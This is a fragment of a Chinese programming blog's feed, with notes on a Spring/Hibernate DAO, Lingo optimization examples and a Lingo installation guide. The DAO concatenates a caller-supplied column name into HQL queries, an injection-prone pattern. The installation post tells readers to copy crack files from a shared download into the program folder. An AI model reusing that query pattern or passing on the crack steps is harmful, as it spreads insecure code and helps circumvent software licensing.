class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tianxingjian.dao.impl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"><span class="keyword">import</span> org.hibernate.Query;</span><br><span class="line"><span class="keyword">import</span> org.hibernate.criterion.DetachedCriteria;</span><br><span class="line"><span class="keyword">import</span> org.hibernate.criterion.Restrictions;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.orm.hibernate4.HibernateTemplate;</span><br><span class="line"><span class="keyword">import</span> org.springframework.orm.hibernate4.support.HibernateDaoSupport;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> com.tianxingjian.dao.INewsDAO;</span><br><span class="line"><span class="keyword">import</span> com.tianxingjian.pojo.News;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NewsDAOImpl</span> <span class="keyword">extends</span> <span class="title">HibernateDaoSupport</span> <span class="keyword">implements</span> <span class="title">INewsDAO</span> </span>&#123;</span><br><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">NewsDAOImpl</span><span class="params">(HibernateTemplate ht)</span> </span>&#123;</span><br><span class="line"><span class="keyword">super</span>.setHibernateTemplate(ht);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//@Resource</span></span><br><span class="line"><span class="comment">//private SessionFactory sessionFactory;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">boolean</span> <span class="title">doCreate</span><span class="params">(News vo)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">super</span>.getHibernateTemplate().save(vo) != <span class="keyword">null</span>;</span><br><span class="line"><span class="comment">//return sessionFactory.getCurrentSession().save(vo) != null;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">boolean</span> <span class="title">doUpdate</span><span class="params">(News vo)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">String hql = <span class="string">"update News set title=?, date=?, content=? where nid=?"</span>;</span><br><span class="line"><span class="comment">//Query query = super.getHibernateTemplate().createQuery(hql);</span></span><br><span class="line">Query query = <span class="keyword">super</span>.getHibernateTemplate().getSessionFactory().getCurrentSession().createQuery(hql);</span><br><span class="line">query.setParameter(<span class="number">0</span>, vo.getTitle());</span><br><span class="line">query.setParameter(<span class="number">1</span>, vo.getDate());</span><br><span class="line">query.setParameter(<span class="number">2</span>, vo.getContent());</span><br><span class="line">query.setParameter(<span class="number">3</span>, vo.getNid());</span><br><span class="line"><span class="keyword">return</span> query.executeUpdate() &gt; <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="function">News <span class="title">getElementById</span><span class="params">(Integer id)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">super</span>.getHibernateTemplate().get(News.class, id);</span><br><span class="line"><span class="comment">// return (News) this.sessionFactory.getCurrentSession().get(News.class, id);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">boolean</span> <span class="title">doRemoveBatch</span><span class="params">(Set&lt;Integer&gt; ids)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">StringBuffer buffer = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">buffer.append(<span class="string">"delete from News where nid in ("</span>);</span><br><span class="line">Iterator&lt;Integer&gt; iterator = ids.iterator();</span><br><span class="line"><span class="keyword">while</span> (iterator.hasNext()) &#123;</span><br><span class="line">buffer.append(iterator.next()).append(<span class="string">","</span>);</span><br><span class="line">&#125;</span><br><span class="line">buffer.delete(buffer.length()<span class="number">-1</span>, buffer.length()).append(<span class="string">")"</span>);</span><br><span class="line">Query query = <span class="keyword">super</span>.getHibernateTemplate().getSessionFactory().getCurrentSession().createQuery(buffer.toString());</span><br><span class="line"><span class="comment">// Query query = this.sessionFactory.getCurrentSession().createQuery(buffer.toString());</span></span><br><span class="line"><span class="keyword">return</span> query.executeUpdate() &gt; <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="function">List <span class="title">findAll</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">DetachedCriteria dc = DetachedCriteria.forClass(News.class);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">super</span>.getHibernateTemplate().findByCriteria(dc);</span><br><span class="line"><span class="comment">//Criteria criteria = this.sessionFactory.getCurrentSession().createCriteria(News.class);</span></span><br><span class="line"><span class="comment">//return criteria.list();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="function">List <span class="title">findAllSplit</span><span class="params">(String column, String keyWord, Integer currentPage, Integer lineSize)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">DetachedCriteria dc = DetachedCriteria.forClass(News.class);</span><br><span class="line">dc.add(Restrictions.ilike(column, <span class="string">"%"</span> + keyWord + <span class="string">"%"</span>));</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">super</span>.getHibernateTemplate().findByCriteria(dc, (currentPage<span class="number">-1</span>)*lineSize, lineSize);</span><br><span class="line"><span class="comment">//String hql = "from News as n where n." + column + " like ?";</span></span><br><span class="line"><span class="comment">//Query query = this.sessionFactory.getCurrentSession().createQuery(hql);</span></span><br><span class="line"><span class="comment">//query.setParameter(0, "%" + keyWord + "%");</span></span><br><span class="line"><span class="comment">//query.setFirstResult((currentPage-1)*lineSize);</span></span><br><span class="line"><span class="comment">//query.setMaxResults(lineSize);</span></span><br><span class="line"><span class="comment">//return query.list();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="function">Integer <span class="title">getAllCount</span><span class="params">(String column, String keyWord)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">String hql = <span class="string">"select count(*) from News as n where n."</span> + column + <span class="string">" like ?"</span>;</span><br><span class="line">Long count = (Long) <span class="keyword">super</span>.getHibernateTemplate().find(hql, <span class="string">"%"</span> + keyWord + <span class="string">"%"</span>).get(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//Query query = this.sessionFactory.getCurrentSession().createQuery(hql);</span></span><br><span class="line"><span class="comment">//query.setParameter(0, "%" + column + "%");</span></span><br><span class="line"><span class="comment">//Long count = (Long) query.uniqueResult();</span></span><br><span class="line"><span class="function"><span class="keyword">return</span> count.<span class="title">intValue</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="4-2-HibernateDaoSupport使用总结"><a href="#4-2-HibernateDaoSupport使用总结" class="headerlink" title="4.2 HibernateDaoSupport使用总结"></a><strong>4.2 HibernateDaoSupport使用总结</strong></h3><pre><code>    使用HibernateDaoSupport的时候感觉似乎也并没有简单什么， 以上是两种操作方式，分别是使用SessionFactory和HibernateDaoSupport，这两个种基本都差不多，即在实际开发中这两种方法可根据自己的喜好来使用。</code></pre><h2 id="5-使用MyEclipse进行SSH项目整合总结"><a href="#5-使用MyEclipse进行SSH项目整合总结" class="headerlink" title="5. 使用MyEclipse进行SSH项目整合总结"></a><strong>5. 使用MyEclipse进行SSH项目整合总结</strong></h2><pre><code>    以上便是此次利用MyEclipse进行SSH项目整合总结，感觉今天的学习效率很低，一天下来只是学了这个部分的内容，而且并不是说今天之后就被完全吸收，在之后的学习过程中还是需要不断的进行反反复复的温习。    学习时间：2018-07-17</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;以下内容为博主学习Struts+Spring+Hibernate框架时所写笔记，有点凌乱，还未整理。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;1-将Spring与Hibernate进行整合&quot;&gt;&lt;a href=&quot;#1-将Spring与Hi
      
    
    </summary>
    
      <category term="Java" scheme="muzimz.cn/categories/Java/"/>
    
    
      <category term="Struts" scheme="muzimz.cn/tags/Struts/"/>
    
      <category term="Spring" scheme="muzimz.cn/tags/Spring/"/>
    
      <category term="Hibernate" scheme="muzimz.cn/tags/Hibernate/"/>
    
  </entry>
  
  <entry>
    <title>Lingo解决优化问题</title>
    <link href="muzimz.cn/2018/09/14/Lingo%E8%A7%A3%E5%86%B3%E4%BC%98%E5%8C%96%E9%97%AE%E9%A2%98/"/>
    <id>muzimz.cn/2018/09/14/Lingo解决优化问题/</id>
    <published>2018-09-14T11:01:07.000Z</published>
    <updated>2018-11-24T12:49:28.029Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前面，我们已经对Lingo有了一定的了解，但是要想真正的熟悉Lingo在解决优化问题中的强大之处，还需要不断加强相关训练，本文主要是使用Lingo来解决优化问题，该文的主要目的有以下三点：</p><ul><li>希望能够提升自己对Lingo的相关操作并加强对优化问题的思维模式</li><li>方便日后对Lingo核心操作的回顾</li><li>希望每一位到来的朋友能够有所收获</li></ul><blockquote><p>若您对Lingo的安装及基本操作不是很了解，可暂且移步：<a href="https://blog.csdn.net/Python__Boy/article/details/82055040" target="_blank" rel="noopener">Lingo安装</a>、<a href="https://blog.csdn.net/Python__Boy/article/details/82224666" target="_blank" rel="noopener">Lingo基本操作</a></p></blockquote><h2 id="优化模型介绍"><a href="#优化模型介绍" class="headerlink" title="优化模型介绍"></a><a href="https://baike.baidu.com/item/%E6%9C%80%E4%BC%98%E5%8C%96%E6%A8%A1%E5%9E%8B/9116053" target="_blank" rel="noopener">优化模型</a>介绍</h2><p>优化模型主要有三个基本要素：决策变量、目标函数、约束条件。其一般形式如下：</p><script type="math/tex; mode=display">opt \ \ \ \ f(x) \\s.t \ \ \ \ h_i(x)=0,\ i=1,2,\cdots,m \\g_j(x)\leq0,\ j=1,2,\cdots,l</script><p>$opt$ 是“optimize”的缩写，表示“最优化”，一般为 $min$ 或 $max$，$f(x)$ 表示目标函数，$s.t.$ 是“subject to”的缩写“受约束于”，$h_i(x), g_i(x)$ 则表示约束条件，其中 $x$ 表示优化模型的决策变量。</p><h2 id="运输问题"><a href="#运输问题" class="headerlink" title="运输问题"></a><a href="https://baike.baidu.com/item/%E8%BF%90%E8%BE%93%E9%97%AE%E9%A2%98/12734790?fr=aladdin" target="_blank" rel="noopener">运输问题</a></h2><h3 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h3><blockquote><p>Question：有三个生产地和四个销售地，其生产量、销售量及单位运费如表所示，求总运费最少的运输方案以及总运费。</p></blockquote><center><img src="https://gss0.baidu.com/-Po3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/faedab64034f78f0fcf571d074310a55b3191c12.jpg"></center><h3 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h3><p>由题意，我们不难看出优化模型的决策变量是每个生产地向各个销售地运输的货量，即 $s_{ij}$。运输的总费用由各个产地向各个销售地运输所需费用之和，一个产地可以向多个销售地运输货物，一个销售地亦可接受多个产地的货物，所以可知优化模型中的目标函数是运输的总费用，即 $W=\sum^3_{i=1}\sum^4_{j=1}s_{ij}x_{ij}$。除此之外，该目标函数受到两个限制，即优化模型的约束条件：</p><ul><li>生产地限制：每个生产地的运输量理应小于产生量，$\sum_{j=1}^4s_{ij}\leq a_i$</li><li>销售地限制：每个销售地接受的货物理应等于销售量，$\sum_{i=1}^3x_{ij}=b_j$</li></ul><h3 id="优化模型构建"><a href="#优化模型构建" class="headerlink" title="优化模型构建"></a>优化模型构建</h3><p>有以上问题分析，为求出总运费最小的方案，我们可以构建该问题的优化模型如下：</p><script type="math/tex; mode=display">min \ \ \ \ \sum^3_{i=1}\sum^4_{j=1}s_{ij}x_{ij} \\s.t. \ \ \ \ \sum_{j=1}^4s_{ij}\leq a_i \;;\ \sum_{i=1}^3x_{ij}=b_j \ ;\ s_{ij}\geq0 \ ;</script><h3 id="模型求解"><a href="#模型求解" class="headerlink" title="模型求解"></a>模型求解</h3><p>求解的Lingo代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">sets:</span><br><span class="line">supply/1..3/: a;</span><br><span class="line">demand/1..4/: b;</span><br><span class="line">link(supply, demand): c, x;</span><br><span class="line">endsets</span><br><span class="line"></span><br><span class="line">data:</span><br><span class="line">a = 30,25,21;</span><br><span class="line">b = 15,17,22,12;</span><br><span class="line">c = 6,2,6,7,</span><br><span class="line">4,9,5,3,</span><br><span class="line">8,8,1,5;</span><br><span class="line">enddata</span><br><span class="line"></span><br><span class="line">min = @sum(link(i,j): c(i,j) * x(i,j));</span><br><span class="line">@for(supply(i): @sum(demand(j): x(i,j)) &lt;= a(i));</span><br><span class="line">@for(demand(j): @sum(supply(i): x(i,j)) = b(j));</span><br></pre></td></tr></table></figure><h3 id="求解结果"><a href="#求解结果" class="headerlink" title="求解结果"></a>求解结果</h3><p>运行如上所示Lingo程序，我们可以得到如下结果：</p><center><img src="https://gss0.baidu.com/9fo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/f2deb48f8c5494ee6a0fd73a20f5e0fe99257ee0.jpg"></center><p>通过上图展示，我们可以得到运输的最佳方案以及最小运费161个单位。运输方案图示如下：</p><center><img src="https://gss0.baidu.com/9vo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/4e4a20a4462309f7d17476317f0e0cf3d7cad6fe.jpg" width="250"></center><h3 id="待续"><a href="#待续" class="headerlink" title="待续"></a>待续</h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;前面，我们已经对Lingo有了一定的了解，但是要想真正的熟悉Lingo在解决优化问题中的强大之处，还需要不断加强相关训练，本文主要是使用Li
      
    
    </summary>
    
      <category term="Lingo" scheme="muzimz.cn/categories/Lingo/"/>
    
    
      <category term="Lingo" scheme="muzimz.cn/tags/Lingo/"/>
    
      <category term="建模" scheme="muzimz.cn/tags/%E5%BB%BA%E6%A8%A1/"/>
    
  </entry>
  
  <entry>
    <title>Lingo基本操作</title>
    <link href="muzimz.cn/2018/09/14/Lingo%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/"/>
    <id>muzimz.cn/2018/09/14/Lingo基本操作/</id>
    <published>2018-09-14T01:56:43.000Z</published>
    <updated>2018-11-24T12:45:05.427Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h2><p>Lingo是一门主要求解非线性规划数学模型的编程软件，记得最初接触Lingo是在阅读<a href="http://product.dangdang.com/24073200.html" target="_blank" rel="noopener">《数学建模教程》</a>一书，该书在第五章主要讲解使用Lingo来解决优化问题，也是在那个时候认识到了Lingo的强大之处。Lingo的使用就好比解决一道简单的数学问题，而你只需要使用Lingo支持的编程规范给其提供充足的已知条件即可，之后会自动使用相关算法为您解答。为了日后更加方便的查询Lingo相关知识，所以将Lingo的基本使用在此记录。</p><blockquote><p>关于Lingo的下载及安装问题鄙人已做整理，可参考本篇教程 <a href="https://blog.csdn.net/Python__Boy/article/details/82055040" target="_blank" rel="noopener">Lingo安装</a></p></blockquote><h2 id="Lingo基本运算符"><a href="#Lingo基本运算符" class="headerlink" title="Lingo基本运算符"></a><strong>Lingo基本运算符</strong></h2><h3 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a><strong>算术运算符</strong></h3><p>^：乘方<br>*：乘<br>/：除<br>+：加<br>-：减</p><h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a><strong>逻辑运算符</strong></h3><p>在Lingo中，逻辑运算符主要用于集循环函数的条件表达式中，来控制在函数中哪些集成员被包含，哪些被排斥。</p><div class="table-container"><table><thead><tr><th style="text-align:center">符号</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center">#and#</td><td style="text-align:center">且，&amp;</td></tr><tr><td style="text-align:center">#or#</td><td style="text-align:center">或，\</td><td>\</td><td></td></tr><tr><td style="text-align:center">#not#</td><td style="text-align:center">非，!</td></tr><tr><td style="text-align:center">#eq#</td><td style="text-align:center">等于，==</td></tr><tr><td style="text-align:center">#ne#</td><td style="text-align:center">不等于，!=</td></tr><tr><td style="text-align:center">#gt#</td><td style="text-align:center">大于，&gt;</td></tr><tr><td style="text-align:center">#ge#</td><td style="text-align:center">大于等于，&gt;=</td></tr><tr><td style="text-align:center">#lt#</td><td style="text-align:center">小于，&lt;</td></tr><tr><td style="text-align:center">#le#</td><td style="text-align:center">小于等于，&lt;=</td></tr></tbody></table></div><h3 id="关系运算符"><a href="#关系运算符" class="headerlink" title=" 关系运算符"></a><strong> 关系运算符</strong></h3><p>= 、&lt;= 、 &gt;=</p><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a><strong>函数</strong></h2><h3 id="标准数学函数"><a href="#标准数学函数" class="headerlink" title="标准数学函数"></a><strong>标准数学函数</strong></h3><div class="table-container"><table><thead><tr><th style="text-align:center">函数</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center">@abs(x)</td><td style="text-align:center">绝对值</td></tr><tr><td style="text-align:center">@sin(x)</td><td style="text-align:center">正弦值，采用弧度制</td></tr><tr><td style="text-align:center">@cos(x)</td><td style="text-align:center">余弦值</td></tr><tr><td style="text-align:center">@tan(x)</td><td style="text-align:center">正切</td></tr><tr><td style="text-align:center">@exp(x)</td><td style="text-align:center">指数，$e^x$</td></tr><tr><td style="text-align:center">@log(x)</td><td style="text-align:center">自然对数</td></tr><tr><td style="text-align:center">@lgm(x)</td><td style="text-align:center">gamma函数的自然对数</td></tr><tr><td style="text-align:center">@sign(x)</td><td style="text-align:center">x&lt;0返回-1，否则返回返回1</td></tr><tr><td style="text-align:center">@floor(x)</td><td style="text-align:center">取整</td></tr><tr><td style="text-align:center">@smax($x_1,x_2,\cdots,x_n$)</td><td style="text-align:center">取($x_1,x_2,\cdots,x_n$) 中的最大值</td></tr><tr><td style="text-align:center">@smin($x_1,x_2,\cdots,x_n$)</td><td style="text-align:center">取($x_1,x_2,\cdots,x_n$) 中的最小值</td></tr></tbody></table></div><h3 id="集循环函数"><a href="#集循环函数" class="headerlink" title="集循环函数"></a><strong>集循环函数</strong></h3><p>集循环函数用于遍历整个集，其基本语法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@function(setname[(set_index_list)[|conditional_qualifier]]:</span><br><span class="line">expression_list);</span><br></pre></td></tr></table></figure><pre><code>@function相应于下面罗列的四个集循环函数之一；setname是要遍历的集；set_ index_list是集索引列表；conditional_qualifier是用来限制集循环函数的范围，当集循环函数遍历集的每个成员时，LINGO都要对conditional_qualifier进行评价，若结果为真，则对该成员执行@function操作，否则跳过，继续执行下一次循环。expression_list是被应用到每个集成员的表达式列表，当用的是@for函数时，expression_list可以包含多个表达式，其间用逗号隔开。这些表达式将被作为约束加到模型中。当使用其余的三个集循环函数时，expression_list只能有一个表达式。如果省略set_index_list，那么在expression_list中引用的所有属性的类型都是setname集。</code></pre><h4 id="for"><a href="#for" class="headerlink" title="@for"></a><strong>@for</strong></h4><p>@for函数用来对集中的成员形成约束。</p><p>例：产生序列[1,4,9,16,25]</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sets:</span><br><span class="line">nums/1..5/: x;</span><br><span class="line">endsets</span><br><span class="line"></span><br><span class="line">@for(nums(i): x(i)=i^2);</span><br></pre></td></tr></table></figure><center>    <img src="https://gss0.baidu.com/7Po3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/f11f3a292df5e0fede20f83e516034a85edf72d0.jpg"></center><h4 id="sum"><a href="#sum" class="headerlink" title="@sum"></a><strong>@sum</strong></h4><p>@sum函数返回遍历指定集成员的一个表达式的和</p><p>例：求[1,2,3,4,5,6,7]中前五个数的和</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sets:</span><br><span class="line">nums/1..7/: x;</span><br><span class="line">endsets</span><br><span class="line"></span><br><span class="line">@for(nums(i): x(i)=i);</span><br><span class="line"></span><br><span class="line">s = @sum(nums(i) | i #le# 5: x(i));</span><br></pre></td></tr></table></figure><center>    <img src="https://gss0.baidu.com/-fo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/91529822720e0cf339223ec40746f21fbe09aa3c.jpg"></center><h4 id="max，-min"><a href="#max，-min" class="headerlink" title="@max，@min"></a><strong>@max，@min</strong></h4><p>这两个函数分别用于返回指定集成员的一个表达式的最大值和最小值</p><p>例：求[1,2,3,4,5,6,7,8,9,10]中前五个数的最大值，后五个数的最小值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sets:</span><br><span class="line">nums/1..10/: x;</span><br><span class="line">endsets</span><br><span class="line"></span><br><span class="line">@for(nums(i): x(i)=i);</span><br><span class="line"></span><br><span class="line">min_value = @max(nums(i) | i #le# 5: x);</span><br><span class="line">max_value = @min(nums(i) | i #ge# 6: x);</span><br></pre></td></tr></table></figure><center>    <img src="https://gss0.baidu.com/7Po3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/cdbf6c81800a19d8eb24f93a3efa828ba61e46ed.jpg"></center><h4 id="变量界定函数"><a href="#变量界定函数" class="headerlink" title="变量界定函数"></a><strong>变量界定函数</strong></h4><p>该函数主要是对决策变量做附加限制，一般用于@for函数中，主要有如下四种：</p><div class="table-container"><table><thead><tr><th style="text-align:center">函数</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center">@bin(x)</td><td style="text-align:center">限制x为0或1</td></tr><tr><td style="text-align:center">@bnd(a,x,b)</td><td style="text-align:center">限制x取a到b之间的值</td></tr><tr><td style="text-align:center">@free(x)</td><td style="text-align:center">x取实数</td></tr><tr><td style="text-align:center">@gin(x)</td><td style="text-align:center">x取整数</td></tr></tbody></table></div><h4 id="说明"><a href="#说明" class="headerlink" title="说明"></a><strong>说明</strong></h4><blockquote><p>Lingo中还有其他大量的函数，比如金融函数、概率函数、变量界定函数，由于目前鄙人暂时用不上，所以就暂且不记录了，待需要时再做进一步更新。</p></blockquote><h2 id="待更新"><a href="#待更新" class="headerlink" title="待更新"></a><strong>待更新</strong></h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;&lt;strong&gt;前言&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;Lingo是一门主要求解非线性规划数学模型的编程软件，记得最初接触Lingo是在阅读&lt;a href=&quot;ht
      
    
    </summary>
    
      <category term="Lingo" scheme="muzimz.cn/categories/Lingo/"/>
    
    
      <category term="Lingo" scheme="muzimz.cn/tags/Lingo/"/>
    
      <category term="建模" scheme="muzimz.cn/tags/%E5%BB%BA%E6%A8%A1/"/>
    
  </entry>
  
  <entry>
    <title>Lingo安装</title>
    <link href="muzimz.cn/2018/09/13/Lingo%E5%AE%89%E8%A3%85/"/>
    <id>muzimz.cn/2018/09/13/Lingo安装/</id>
    <published>2018-09-13T10:49:19.000Z</published>
    <updated>2018-11-24T12:45:06.382Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Lingo简介"><a href="#Lingo简介" class="headerlink" title="Lingo简介"></a><strong>Lingo简介</strong></h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LINGO是Linear Interactive and General Optimizer的缩写，即“交互式的线性和通用优化求解器”，由美国LINDO系统公司（Lindo System Inc.）推出的，可以用于求解非线性规划，也可以用于一些线性和非线性方程组的求解等，功能十分强大，是求解优化模型的最佳选择。其特色在于内置建模语言，提供十几个内部函数，可以允许决策变量是整数（即整数规划，包括 0-1 整数规划），方便灵活，而且执行速度非常快。能方便与EXCEL，数据库等其他软件交换数据。</p><h2 id="Lingo安装"><a href="#Lingo安装" class="headerlink" title="Lingo安装"></a><strong>Lingo安装</strong></h2><ul><li>Lingo下载地址：<a href="https://pan.baidu.com/s/1MsEp2RdYzMsOLl4imJfsYQ" target="_blank" rel="noopener">点击我</a>&nbsp;&nbsp;&nbsp;&nbsp;密码：r6cy</li><li>下载到本地并解压后可见以下文件</li></ul><center><img src="https://gss0.baidu.com/-vo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/54fbb2fb43166d22da18b6aa4b2309f79052d2a5.jpg"></center><ul><li>双击运行LINGO-WINDOWS-IA32-12.0.exe可执行文件</li></ul><center><img src="https://gss0.baidu.com/-4o3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/9a504fc2d562853501de711f9def76c6a7ef63d6.jpg"></center><ul><li>单击Next</li></ul><center><img src="https://gss0.baidu.com/-fo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/9922720e0cf3d7cae5989c48ff1fbe096b63a9a6.jpg"></center><ul><li>单击I accept 并Next</li></ul><center><img src="https://gss0.baidu.com/9fo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/902397dda144ad34938624b9dda20cf431ad85d7.jpg"></center><ul><li>更改安装目录，Next</li></ul><center><img src="https://gss0.baidu.com/-vo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/d1160924ab18972be902a3f4ebcd7b899e510ad7.jpg"></center><ul><li>点击Only For Me，出现后续窗口点击OK</li></ul><center><img src="https://gss0.baidu.com/94o3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/6c224f4a20a4462391a2065c9522720e0cf3d7a0.jpg"></center><ul><li>取消Launch，并Finish</li></ul><center><img src="https://gss0.baidu.com/9vo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/b21bb051f81986185fe94cba47ed2e738bd4e666.jpg"></center><ul><li>打开“lingo12破解文件”并复制所有文件粘贴至Lingo所在目录</li></ul><center><img src="https://gss0.baidu.com/9vo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/a71ea8d3fd1f41348656a640281f95cad1c85eae.jpg"></center><center><img src="https://gss0.baidu.com/-Po3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/0b46f21fbe096b63558afd6e01338744ebf8ac79.jpg"></center><center><img src="https://gss0.baidu.com/9fo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/0b55b319ebc4b74519331428c2fc1e178a82156c.jpg"></center><center><img src="https://gss0.baidu.com/-Po3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/7af40ad162d9f2d3d45f87d1a4ec8a136327cc46.jpg"></center><ul><li>安装完成</li></ul><h2 id="安装声明"><a href="#安装声明" class="headerlink" title="安装声明"></a>安装声明</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;提供的安装文件皆来自网络共享资源，若想更好的体验请支持正版,Lingo官网下载地址:<a href="https://www.lindo.com/index.php/ls-downloads/try-lingo" target="_blank" 